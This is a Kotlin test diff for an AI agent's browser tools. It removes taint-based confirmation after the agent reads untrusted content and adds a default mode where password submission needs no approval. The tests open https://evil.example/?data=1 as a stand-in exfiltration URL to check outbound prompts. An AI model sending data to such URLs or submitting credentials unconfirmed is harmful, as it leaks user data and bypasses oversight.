@@ -3,7 +3,10 @@ package io.github.fartown.movo.agent.tools.browser
 import androidx.test.core.app.ApplicationProvider
 import io.github.fartown.movo.agent.model.AgentModelClient
 import io.github.fartown.movo.agent.tools.core.AgentTool
+import io.github.fartown.movo.agent.tools.core.ApprovalCategory
 import io.github.fartown.movo.agent.tools.core.ApprovalDecision
+import io.github.fartown.movo.agent.tools.core.ApprovalPolicy
+import io.github.fartown.movo.agent.tools.core.PermissionMode
 import io.github.fartown.movo.agent.tools.core.ApprovalRequest
 import io.github.fartown.movo.agent.tools.core.Concurrency
 import io.github.fartown.movo.agent.tools.core.ContractTool
@@ -103,6 +106,11 @@ class BrowserToolsTest {
     ).also { it.catalog() }
 
     private fun call(name: String, args: String) = AgentModelClient.ToolCall("c1", name, args)
+
+    private val manual = ToolEnvironment(approvalPolicy = ApprovalPolicy.MANUAL_BUILT_IN)
+    private val manualOutbound = ToolEnvironment(
+        approvalPolicy = ApprovalPolicy(mode = PermissionMode.MANUAL, categories = setOf(ApprovalCategory.OUTBOUND)),
+    )
 
     private val declining = object : UserInteraction {
         override val available = true
@@ -219,9 +227,9 @@ class BrowserToolsTest {
     }
 
     @Test
-    fun act_typeSubmitPoint_requiresApprovalAndDeclineBlocks() {
+    fun act_typeSubmitPoint_manualMode_asksAndDeclineBlocks() {
         fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "登录", submitPoint = true, searchRole = false) }
-        val r = pipeline(interaction = declining).execute(
+        val r = pipeline(env = manual, interaction = declining).execute(
             call("browser_act", """{"action":"type","selector":"#pw","text":"secret","submit":true}"""),
         )
         assertEquals("USER_DECLINED", r.errorCode)
@@ -229,12 +237,22 @@ class BrowserToolsTest {
     }
 
     @Test
+    fun act_typeSubmitPoint_yolo_submitsWithoutCard() {
+        fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "登录", submitPoint = true, searchRole = false) }
+        val r = pipeline(interaction = declining).execute(
+            call("browser_act", """{"action":"type","selector":"#pw","text":"secret","submit":true}"""),
+        )
+        assertEquals("ok", r.status)
+        assertTrue(fake.performed)
+    }
+
+    @Test
     fun act_searchFormSubmit_notConfirmed() {
         fake.inspectResult = { BrowserActTarget(exists = true, stale = false, visible = true, editable = true, summary = "搜索", submitPoint = true, searchRole = true) }
-        val r = pipeline(interaction = declining).execute(
+        val r = pipeline(env = manual, interaction = declining).execute(
             call("browser_act", """{"action":"type","selector":"#q","text":"猫","submit":true}"""),
         )
-        // role=search / GET 表单不确认，直接送达。
+        // role=search / GET 表单不算提交，手动审批也直接送达。
         assertEquals("ok", r.status)
         assertTrue(fake.performed)
     }
@@ -262,23 +280,17 @@ class BrowserToolsTest {
         assertEquals("OUTCOME_UNKNOWN", r.errorCode)
     }
 
-    // ---- 污点：读过不可信内容后，导航走中央 TAINTED 确认 ----
+    // ---- 带参数的网址归为「把内容发到外部」：手动审批且用户勾了这条才问 ----
 
     @Test
-    fun open_afterTaint_requiresApprovalAndDeclineBlocks() {
-        val taintProvider = object : ToolProvider {
-            override val tools = listOf(TaintingTool())
-        }
-        val p = pipeline(interaction = declining, extra = listOf(taintProvider))
-        // 先触发污点
-        p.execute(call("taint_fake", "{}"))
-        val r = p.execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
+    fun open_withQuery_outboundRule_asksAndDeclineBlocks() {
+        val r = pipeline(env = manualOutbound, interaction = declining)
+            .execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
         assertEquals("USER_DECLINED", r.errorCode)
     }
 
     @Test
-    fun open_afterTaint_approvalCardHasReadableTitleAndUrl() {
-        // 真机验收发现：污点派生审批的确认卡内容区空白。确认卡必须有可读标题，正文要显示将打开的链接。
+    fun open_withQuery_approvalCardHasReadableTitleAndUrl() {
         val captured = java.util.concurrent.atomic.AtomicReference<ApprovalRequest?>(null)
         val capturing = object : UserInteraction {
             override val available = true
@@ -288,12 +300,8 @@ class BrowserToolsTest {
                 return ApprovalDecision.Declined
             }
         }
-        val taintProvider = object : ToolProvider {
-            override val tools = listOf(TaintingTool())
-        }
-        val p = pipeline(interaction = capturing, extra = listOf(taintProvider))
-        p.execute(call("taint_fake", "{}"))
-        p.execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
+        pipeline(env = manualOutbound, interaction = capturing)
+            .execute(call("browser_open", """{"url":"https://evil.example/?data=1"}"""))
         val request = captured.get()
         assertTrue("应弹出确认卡", request != null)
         assertTrue("标题不能为空", request!!.title.isNotBlank())
@@ -301,9 +309,9 @@ class BrowserToolsTest {
     }
 
     @Test
-    fun open_cleanRun_noApproval() {
-        val r = pipeline().execute(call("browser_open", """{"url":"https://x/?q=1"}"""))
-        assertEquals("ok", r.status)
+    fun open_withQuery_noRule_noApproval() {
+        assertEquals("ok", pipeline(interaction = declining).execute(call("browser_open", """{"url":"https://x/?q=1"}""")).status)
+        assertEquals("ok", pipeline(env = manual, interaction = declining).execute(call("browser_open", """{"url":"https://x/?q=1"}""")).status)
     }
 
     // ---- 开关：网页关闭时三工具不可用 ----
@@ -335,19 +343,5 @@ class BrowserToolsTest {
         val r = pipeline().execute(call("browser_act", """{"action":"key","key":"enter"}"""))
         assertEquals("ok", r.status)
         assertTrue(fake.performed)
-    }
-
-    /** 直接产生污点的测试工具（raw AgentTool，覆盖 taintKinds）：两类污点同时成立。 */
-    private class TaintingTool : AgentTool {
-        override val name = "taint_fake"
-        override val domain = ToolDomain.BROWSER
-        override val description = "标污点的测试工具"
-        override fun parameters(env: ToolEnvironment) = JSONObject().put("type", "object")
-        override fun risk(args: ToolArgs, env: ToolEnvironment) = Risk.READ
-        override fun sensitivity(args: ToolArgs, env: ToolEnvironment) = Sensitivity.PRIVATE
-        override fun concurrency(args: ToolArgs, env: ToolEnvironment) = Concurrency.Exclusive(ToolResource.BROWSER)
-        override fun taintKinds(args: ToolArgs, outcome: ToolOutcome) =
-            setOf(io.github.fartown.movo.agent.tools.core.TaintKind.UNTRUSTED, io.github.fartown.movo.agent.tools.core.TaintKind.PERSONAL)
-        override fun execute(args: ToolArgs, ctx: ToolContext) = ToolOutcome.ok(JSONObject().put("read", true))
     }
 }
